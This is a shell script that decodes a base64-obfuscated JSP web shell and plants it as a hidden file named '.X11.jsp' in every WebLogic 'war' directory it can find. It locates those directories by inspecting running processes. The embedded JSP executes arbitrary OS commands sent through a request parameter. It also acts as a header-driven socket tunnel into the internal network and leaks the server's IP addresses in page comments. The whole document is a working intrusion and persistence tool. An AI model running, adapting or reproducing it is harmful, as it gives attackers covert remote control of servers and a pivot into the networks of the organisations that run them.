tmpFl=`mktemp`
echo PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmEuaW8uKixqYXZhLm5pby5CeXRlQnVmZmVyLCBqYXZhLm5ldC5JbmV0U29ja2V0QWRkcmVzcywgamF2YS5uaW8uY2hhbm5lbHMuU29ja2V0Q2hhbm5lbCwgamF2YS51dGlsLkFycmF5cywgamF2YS5pby5JT0V4Y2VwdGlvbiwgamF2YS5uZXQuVW5rbm93bkhvc3RFeGNlcHRpb24sIGphdmEubmV0LlNvY2tldCxqYXZhLnV0aWwuSGFzaFNldCxqYXZhLm5ldC5JbmV0QWRkcmVzcyxqYXZhLm5ldC5OZXR3b3JrSW50ZXJmYWNlLGphdmEubmV0LlNvY2tldEV4Y2VwdGlvbixqYXZhLnV0aWwuRW51bWVyYXRpb24samF2YS51dGlsLkl0ZXJhdG9yLGphdmEudXRpbC5TZXQiJT48JQovLyAgdHJpbURpcmVjdGl2ZVdoaXRlc3BhY2VzPSJ0cnVlIgpTdHJpbmcgY21kID0gcmVxdWVzdC5nZXRQYXJhbWV0ZXIoImxzIik7CmlmIChjbWQgIT0gbnVsbCkKewp0cnl7ClByb2Nlc3MgcCA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoY21kKTsKT3V0cHV0U3RyZWFtIG9zID0gcC5nZXRPdXRwdXRTdHJlYW0oKTsKSW5wdXRTdHJlYW0gaW4gPSBwLmdldElucHV0U3RyZWFtKCk7CkRhdGFJbnB1dFN0cmVhbSBkaXMgPSBuZXcgRGF0YUlucHV0U3RyZWFtKGluKTsKU3RyaW5nIGRpc3IgPSBkaXMucmVhZExpbmUoKTsKd2hpbGUgKCBkaXNyICE9IG51bGwgKXsKb3V0LnByaW50bG4oZGlzcik7IGRpc3IgPSBkaXMucmVhZExpbmUoKTt9Cn0gY2F0Y2ggKEV4Y2VwdGlvbiB4KSB7fQp9CgogICAgY21kID0gcmVxdWVzdC5nZXRIZWFkZXIoIlgtQ01EIik7CiAgICBpZiAoY21kICE9IG51bGwpCiAgICB7CiAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLVNUQVRVUyIsICJPSyIpOwogICAgICAgIGlmIChjbWQuY29tcGFyZVRvKCJDT05ORUNUIikgPT0gMCkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgU3RyaW5nIHRhcmdldCA9IHJlcXVlc3QuZ2V0SGVhZGVyKCJYLVRBUkdFVCIpOwogICAgICAgICAgICAgICAgaW50IHBvcnQgPSBJbnRlZ2VyLnBhcnNlSW50KHJlcXVlc3QuZ2V0SGVhZGVyKCJYLVBPUlQiKSk7CiAgICAgICAgICAgICAgICBTb2NrZXRDaGFubmVsIHNvY2tldENoYW5uZWwgPSBTb2NrZXRDaGFubmVsLm9wZW4oKTsKICAgICAgICAgICAgICAgIHNvY2tldENoYW5uZWwuY29ubmVjdChuZXcgSW5ldFNvY2tldEFkZHJlc3ModGFyZ2V0LCBwb3J0KSk7CiAgICAgICAgICAgICAgICBzb2NrZXRDaGFubmVsLmNvbmZpZ3VyZUJsb2NraW5nKGZhbHNlKTsKICAgICAgICAgICAgICAgIHNlc3Npb24uc2V0QXR0cmlidXRlKCJzb2NrZXQiLCBzb2NrZXRDaGFubmVsKTsKICAgICAgICAgICAgICAgIHJlc3BvbnNlLnNldEhlYWRlcigiWC1TVEFUVVMiLCAiT0siKTsKICAgICAgICAgICAgfSBjYXRjaCAoVW5rbm93bkhvc3RFeGNlcHRpb24gZSkgewogICAgICAgICAgICAgICAgU3lzdGVtLm91dC5wcmludGxuKGUuZ2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgICAgIHJlc3BvbnNlLnNldEhlYWRlcigiWC1FUlJPUiIsIGUuZ2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgICAgIHJlc3BvbnNlLnNldEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgICAgICAgICB9IGNhdGNoIChJT0V4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4oZS5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLUVSUk9SIiwgZS5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLVNUQVRVUyIsICJGQUlMIik7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSBpZiAoY21kLmNvbXBhcmVUbygiRElTQ09OTkVDVCIpID09IDApIHsKICAgICAgICAgICAgU29ja2V0Q2hhbm5lbCBzb2NrZXRDaGFubmVsID0gKFNvY2tldENoYW5uZWwpc2Vzc2lvbi5nZXRBdHRyaWJ1dGUoInNvY2tldCIpOwogICAgICAgICAgICB0cnl7CiAgICAgICAgICAgICAgICBzb2NrZXRDaGFubmVsLnNvY2tldCgpLmNsb3NlKCk7CiAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBleCkgewogICAgICAgICAgICAgICAgU3lzdGVtLm91dC5wcmludGxuKGV4LmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgc2Vzc2lvbi5pbnZhbGlkYXRlKCk7CiAgICAgICAgfSBlbHNlIGlmIChjbWQuY29tcGFyZVRvKCJSRUFEIikgPT0gMCl7CiAgICAgICAgICAgIFNvY2tldENoYW5uZWwgc29ja2V0Q2hhbm5lbCA9IChTb2NrZXRDaGFubmVsKXNlc3Npb24uZ2V0QXR0cmlidXRlKCJzb2NrZXQiKTsKICAgICAgICAgICAgdHJ5IHsgICAgICAgICAgICAKICAgICAgICAgICAgICAgIEJ5dGVCdWZmZXIgYnVmID0gQnl0ZUJ1ZmZlci5hbGxvY2F0ZSg1MTIpOwogICAgICAgICAgICAgICAgaW50IGJ5dGVzUmVhZCA9IHNvY2tldENoYW5uZWwucmVhZChidWYpOwogICAgICAgICAgICAgICAgU2VydmxldE91dHB1dFN0cmVhbSBzbyA9IHJlc3BvbnNlLmdldE91dHB1dFN0cmVhbSgpOwogICAgICAgICAgICAgICAgd2hpbGUgKGJ5dGVzUmVhZCA+IDApewogICAgICAgICAgICAgICAgICAgIHNvLndyaXRlKGJ1Zi5hcnJheSgpLDAsYnl0ZXNSZWFkKTsKICAgICAgICAgICAgICAgICAgICBzby5mbHVzaCgpOwogICAgICAgICAgICAgICAgICAgIGJ1Zi5jbGVhcigpOwogICAgICAgICAgICAgICAgICAgIGJ5dGVzUmVhZCA9IHNvY2tldENoYW5uZWwucmVhZChidWYpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLVNUQVRVUyIsICJPSyIpOwogICAgICAgICAgICAgICAgc28uZmx1c2goKTsKICAgICAgICAgICAgICAgIHNvLmNsb3NlKCk7ICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsKICAgICAgICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbihlLmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgICAgICByZXNwb25zZS5zZXRIZWFkZXIoIlgtRVJST1IiLCBlLmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgICAgICByZXNwb25zZS5zZXRIZWFkZXIoIlgtU1RBVFVTIiwgIkZBSUwiKTsKICAgICAgICAgICAgfSAgICAgICAgCiAgICAgICAgICAgIAogICAgICAgIH0gZWxzZSBpZiAoY21kLmNvbXBhcmVUbygiRk9SV0FSRCIpID09IDApCiAgICAgICAgewogICAgICAgICAgICBTb2NrZXRDaGFubmVsIHNvY2tldENoYW5uZWwgPSAoU29ja2V0Q2hhbm5lbClzZXNzaW9uLmdldEF0dHJpYnV0ZSgic29ja2V0Iik7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGludCByZWFkbGVuID0gcmVxdWVzdC5nZXRDb250ZW50TGVuZ3RoKCk7CiAgICAgICAgICAgICAgICBieXRlW10gYnVmZiA9IG5ldyBieXRlW3JlYWRsZW5dOwoKICAgICAgICAgICAgICAgIHJlcXVlc3QuZ2V0SW5wdXRTdHJlYW0oKS5yZWFkKGJ1ZmYsIDAsIHJlYWRsZW4pOwogICAgICAgICAgICAgICAgQnl0ZUJ1ZmZlciBidWYgPSBCeXRlQnVmZmVyLmFsbG9jYXRlKHJlYWRsZW4pOwogICAgICAgICAgICAgICAgYnVmLmNsZWFyKCk7CiAgICAgICAgICAgICAgICBidWYucHV0KGJ1ZmYpOwogICAgICAgICAgICAgICAgYnVmLmZsaXAoKTsKCiAgICAgICAgICAgICAgICB3aGlsZShidWYuaGFzUmVtYWluaW5nKCkpIHsKICAgICAgICAgICAgICAgICAgICBzb2NrZXRDaGFubmVsLndyaXRlKGJ1Zik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICByZXNwb25zZS5zZXRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4oZS5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLUVSUk9SIiwgZS5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLVNUQVRVUyIsICJGQUlMIik7CiAgICAgICAgICAgICAgICBzb2NrZXRDaGFubmVsLnNvY2tldCgpLmNsb3NlKCk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgdHJ5IHsKICAgICAgICBTdHJpbmcgc3pJcCA9ICIiOwogICAgICAgICAgICBTZXQ8SW5ldEFkZHJlc3M+IGFkZHJzID0gbmV3IEhhc2hTZXQ8SW5ldEFkZHJlc3M+KCk7CiAgICAgICAgICAgIEVudW1lcmF0aW9uPE5ldHdvcmtJbnRlcmZhY2U+IG5zID0gbnVsbDsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIG5zID0gTmV0d29ya0ludGVyZmFjZS5nZXROZXR3b3JrSW50ZXJmYWNlcygpOwogICAgICAgICAgICB9IGNhdGNoIChTb2NrZXRFeGNlcHRpb24gZSkgewogICAgICAgICAgICB9CiAgICAgICAgICAgIHdoaWxlIChucyAhPSBudWxsICYmIG5zLmhhc01vcmVFbGVtZW50cygpKSAKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgTmV0d29ya0ludGVyZmFjZSBuID0gbnMubmV4dEVsZW1lbnQoKTsKICAgICAgICAgICAgICAgIEVudW1lcmF0aW9uPEluZXRBZGRyZXNzPiBpcyA9IG4uZ2V0SW5ldEFkZHJlc3NlcygpOwogICAgICAgICAgICAgICAgd2hpbGUgKGlzLmhhc01vcmVFbGVtZW50cygpKSB7CiAgICAgICAgICAgICAgICAgICAgSW5ldEFkZHJlc3MgaSA9IGlzLm5leHRFbGVtZW50KCk7CiAgICAgICAgICAgICAgICAgICAgaWYgKCFpLmlzTG9vcGJhY2tBZGRyZXNzKCkgJiYgIWkuaXNMaW5rTG9jYWxBZGRyZXNzKCkgJiYgIWkuaXNNdWx0aWNhc3RBZGRyZXNzKCkpIHN6SXAgKz0gIiwiICsgaS5nZXRIb3N0QWRkcmVzcygpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIG91dC5wcmludCgiPCEtLSBpcDoiICsgc3pJcCArICIgLS0+Iik7ICAKICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkgewogICAgICAgIH0KICAgICAgICBvdXQucHJpbnQoIjwhLS0gX3h4X3h4XyAtLT4iKTsgCiAgICB9CiU+|base64 -d>$tmpFl
sdomain=`ps -ef|grep domain|grep -Eo '([^ ]*?\.sh)'|sort -u|sed 's/domain.*$//g'`
if [ "${sdomain}" = "" ];
then 
	tmp=`ps -ef|grep java|grep -Eo "(home=[^ ]+)"|sed  's/home=//g'|sed 's/\/wlserver.*$//g'|sort -u|head -n 1`;
	sdomain=`find ${tmp} -type d -name "domains"|grep 'user_projects'`;
fi;
if [ "${sdomain}" = "" ];
then
	tpid=`ps -ef|grep java|grep  'weblogic.Server'|awk '{print $2}'`;
	sdomain=`lsof -p $tpid |grep -Eo '([^ ]+/user_projects/domains/.*domain/)'|sort -u`;
fi;
if [ "${sdomain}" = "" ];
then
	sdomain="/";
fi;
find ${sdomain} -type d -name "war" 2>/dev/null|xargs -I {} cp -f $tmpFl {}/.X11.jsp;
rm -rf $tmpFl;
